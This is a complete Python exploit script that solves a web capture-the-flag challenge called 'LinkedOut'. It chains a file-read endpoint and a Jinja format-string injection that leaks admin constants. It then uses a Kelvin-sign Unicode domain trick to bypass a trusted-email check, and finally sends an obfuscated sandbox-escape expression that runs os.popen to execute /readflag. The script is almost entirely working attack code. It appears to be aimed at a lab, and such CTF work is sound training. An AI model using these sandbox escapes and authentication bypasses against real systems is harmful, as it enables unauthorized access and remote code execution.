#!/usr/bin/env python3
import argparse
import ast
import html
import re
import sys
import uuid

import requests


JINJA_FORMAT_TEMPLATE = (
    '{{ "' + "{0.__class__.render.__globals__[admin_models].%s}" + '"|attr("format")(renderer) }}'
)

CANONICAL_READFLAG_RCE_EXPR = "".join(
    [
        "[[out]",
        "for[x]in[[profile]]",
        "for[x.__typing_subst__]in[[[].__class__.__class__.__subclasses__]]",
        "for[q]in[[].__class__[x][[].__class__.__base__].__args__]",
        "for[x.__typing_subst__]in[[[].__class__.__len__]]",
        "for[one]in[[].__class__[x][[q]].__args__]",
        "for[x.__typing_subst__]in[[one.__add__]]",
        "for[two]in[[].__class__[x][one].__args__]",
        "for[three]in[[].__class__[x][two].__args__]",
        "for[x.__typing_subst__]in[[two.__add__]]",
        "for[four]in[[].__class__[x][two].__args__]",
        "for[x.__typing_subst__]in[[one.__class__.__neg__]]",
        "for[neg_one]in[[].__class__[x][one].__args__]",
        "for[x.__typing_subst__]in[[two.__class__.__neg__]]",
        "for[neg_two]in[[].__class__[x][two].__args__]",
        "for[w]in[[q[neg_two].__init__.__globals__]]",
        "for[u]in[[].__class__.__base__.__subclasses__.__name__[not[[]]]]",
        "for[o]in[[].__class__.__base__.__name__[not[[]]]]",
        "for[s]in[[].__class__.__name__[two]]",
        "for[r]in[[one.__class__.__radd__.__name__[two]]]",
        "for[e]in[[one.__class__.__neg__.__name__[three]]]",
        "for[a]in[[one.__class__.__add__.__name__[two]]]",
        "for[d]in[[one.__class__.__add__.__name__[three]]]",
        "for[f]in[[x.__format__.__name__[two]]]",
        "for[l]in[[].__class__.__name__[not[[]]]]",
        "for[i]in[[].__class__.__name__[one]]",
        "for[g]in[[one.__class__.__neg__.__name__[four]]]",
        "for[x.__typing_subst__]in[[o.__add__]]",
        "for[osstr]in[[].__class__[x][s].__args__]",
        "for[x.__typing_subst__]in[[u.__add__]]",
        "for[du]in[[].__class__[x][u].__args__]",
        "for[x.__typing_subst__]in[[f.__add__]]",
        "for[fi]in[[].__class__[x][i].__args__]",
        "for[x.__typing_subst__]in[[fi.__add__]]",
        "for[fil]in[[].__class__[x][l].__args__]",
        "for[x.__typing_subst__]in[[fil.__add__]]",
        "for[file]in[[].__class__[x][e].__args__]",
        "for[x.__typing_subst__]in[[du.__add__]]",
        "for[dufile]in[[].__class__[x][file].__args__]",
        "for[x.__typing_subst__]in[[dufile.__add__]]",
        "for[filekey]in[[].__class__[x][du].__args__]",
        "for[slash]in[[w[filekey][not[[]]]]]",
        "for[x.__typing_subst__]in[[r.__add__]]",
        "for[re]in[[].__class__[x][e].__args__]",
        "for[x.__typing_subst__]in[[re.__add__]]",
        "for[rea]in[[].__class__[x][a].__args__]",
        "for[x.__typing_subst__]in[[rea.__add__]]",
        "for[read]in[[].__class__[x][d].__args__]",
        "for[x.__typing_subst__]in[[read.__add__]]",
        "for[readf]in[[].__class__[x][f].__args__]",
        "for[x.__typing_subst__]in[[readf.__add__]]",
        "for[readfl]in[[].__class__[x][l].__args__]",
        "for[x.__typing_subst__]in[[readfl.__add__]]",
        "for[readfla]in[[].__class__[x][a].__args__]",
        "for[x.__typing_subst__]in[[readfla.__add__]]",
        "for[readflagcmd]in[[].__class__[x][g].__args__]",
        "for[x.__typing_subst__]in[[slash.__add__]]",
        "for[cmd]in[[].__class__[x][readflagcmd].__args__]",
        "for[x.__typing_subst__]in[[w[osstr].popen]]",
        "for[pipe]in[[].__class__[x][cmd].__args__]",
        "for[x.__typing_subst__]in[[pipe.read]]",
        "for[out]in[[].__class__[x][neg_one].__args__]",
        "]",
    ]
)
READFLAG_RCE_EXPR = CANONICAL_READFLAG_RCE_EXPR


class SolveError(RuntimeError):
    pass


def post_form(session, url, path, data):
    resp = session.post(url + path, data=data, allow_redirects=True, timeout=8)
    resp.raise_for_status()
    return resp


def get(session, url, path):
    resp = session.get(url + path, allow_redirects=True, timeout=8)
    resp.raise_for_status()
    return resp


def last_pre_block(page):
    blocks = re.findall(r"<pre>(.*?)</pre>", page, flags=re.S)
    if not blocks:
        raise SolveError("could not find preview <pre> block")
    return html.unescape(blocks[-1])


def find_flag(value):
    if isinstance(value, bytes):
        text = value.decode(errors="replace").strip()
        if text:
            return text
    if isinstance(value, str) and value.strip():
        return value.strip()
    if isinstance(value, (list, tuple)):
        for item in value:
            flag = find_flag(item)
            if flag:
                return flag
    return ""


def kelvin_domain(domain):
    idx = domain.find("k")
    if idx == -1:
        raise SolveError(f"trusted domain has no lowercase k to replace: {domain}")
    return domain[:idx] + "\u212A" + domain[idx + 1 :]


def register(session, url, email, password):
    resp = post_form(
        session,
        url,
        "/register",
        {"email": email, "password": password},
    )
    if "Your feed" not in resp.text:
        raise SolveError(f"registration did not reach feed for {email}")


def leak_admin_attr(session, url, path):
    resp = post_form(
        session=session,
        url=url,
        path="/compose",
        data={"body": JINJA_FORMAT_TEMPLATE % path},
    )
    return last_pre_block(resp.text)


def solve(base_url, verbose=False):
    url = base_url.rstrip("/")
    token = uuid.uuid4().hex[:10]
    password = "12345"

    user = requests.Session()
    normal_email = f"probe-{token}@test.com"
    register(user, url, normal_email, password)

    requirements = get(user, url, "/media?file=requirements.txt").text
    if "Jinja2==3.1.5" not in requirements:
        raise SolveError("target does not advertise Jinja2==3.1.5")

    app_source = get(user, url, "/media?file=app.py").text
    renderer_source = get(user, url, "/media?file=renderer.py").text
    if "SandboxedEnvironment" not in renderer_source or "from lib import admin_models" not in renderer_source:
        raise SolveError("renderer source does not match the expected challenge shape")
    if "ADMIN_SOURCE" in renderer_source or "linecache" in renderer_source:
        raise SolveError("renderer still exposes a direct source cache")
    if "recruiter_labs.create_blueprint" not in app_source:
        raise SolveError("app source does not expose the expected Labs handoff")

    trusted_domain = leak_admin_attr(user, url, "TRUSTED_DOMAIN")
    labs_route = leak_admin_attr(user, url, "LABS_ROUTE")
    signup_consts = ast.literal_eval(
        leak_admin_attr(user, url, "public_signup_domain_blocked.__code__.co_consts")
    )
    allowed_names = ast.literal_eval(
        leak_admin_attr(user, url, "RecruiterLabsGate.allowed.__code__.co_names")
    )
    domain_consts = ast.literal_eval(
        leak_admin_attr(user, url, "RecruiterLabsGate.domain.__code__.co_consts")
    )
    if not any("COLLATE NOCASE" in str(item) for item in signup_consts):
        raise SolveError("signup policy metadata does not contain the expected SQL collation")
    if "lower" not in allowed_names or "TRUSTED_DOMAIN" not in allowed_names:
        raise SolveError("labs policy metadata does not contain the expected Python lower check")
    if "email" not in domain_consts or "@" not in domain_consts:
        raise SolveError("domain extraction metadata does not match the expected challenge shape")

    recruiter = requests.Session()
    recruiter_email = f"attacker-{token}@{kelvin_domain(trusted_domain)}"
    register(recruiter, url, recruiter_email, password)

    labs = get(recruiter, url, labs_route)
    if "Recruiter Labs" not in labs.text:
        raise SolveError("Kelvin-domain account did not reach Recruiter Labs")

    flag_resp = post_form(recruiter, url, labs_route, {"formula": READFLAG_RCE_EXPR})
    preview = last_pre_block(flag_resp.text)
    value = ast.literal_eval(preview)
    flag = find_flag(value)

    if not flag:
        raise SolveError("empty flag result")

    if verbose:
        print(f"[+] normal user: {normal_email}", file=sys.stderr)
        print(f"[+] leaked TRUSTED_DOMAIN: {trusted_domain}", file=sys.stderr)
        print(f"[+] leaked LABS_ROUTE: {labs_route}", file=sys.stderr)
        print(f"[+] leaked signup co_consts: {signup_consts}", file=sys.stderr)
        print(f"[+] leaked allowed co_names: {allowed_names}", file=sys.stderr)
        print(f"[+] recruiter user: {recruiter_email}", file=sys.stderr)

    return flag


def main():
    parser = argparse.ArgumentParser(description="Solve the LinkedOut Web CTF challenge")
    parser.add_argument("url", nargs="?", default="http://localhost:8000")
    parser.add_argument("-v", "--verbose", action="store_true")
    args = parser.parse_args()

    try:
        print(solve(args.url, args.verbose))
    except (requests.RequestException, SolveError, SyntaxError, ValueError) as exc:
        print(f"solve failed: {exc}", file=sys.stderr)
        raise SystemExit(1)


if __name__ == "__main__":
    main()
